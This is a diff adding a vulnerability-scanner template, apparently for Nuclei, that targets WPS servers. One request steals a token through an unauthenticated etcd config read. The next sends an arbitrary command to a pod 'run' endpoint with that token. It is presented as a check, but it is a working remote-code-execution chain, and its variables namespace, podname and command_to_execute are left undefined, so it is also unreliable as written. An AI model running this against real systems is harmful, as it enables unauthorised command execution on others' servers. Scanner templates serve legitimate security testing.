@@ -1,0 +1,48 @@
+id: wps-unauthorized-rce
+
+info:
+  name: WPS Unauthorized Access Leading to RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template checks for unauthorized access on WPS endpoints that could potentially lead to remote code execution (RCE).
+  tags: rce, unauthorized, wps
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: check-unauthorized-access
+    method: GET
+    path:
+      - "{{BaseURL}}/open/v6/api/etcd/operate?key=/config/storage&method=get"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "config/storage"
+    extractors:
+      - type: json
+        name: token
+        json:
+          - '.token'
+        internal: true
+
+  - id: execute-command
+    method: GET
+    path:
+      - "{{BaseURL}}/open/wps/run/{{namespace}}/{{podname}}/node-exporter?cmd={{url_encode(command_to_execute)}}"
+    headers:
+      Authorization: "Bearer {{token}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "success"
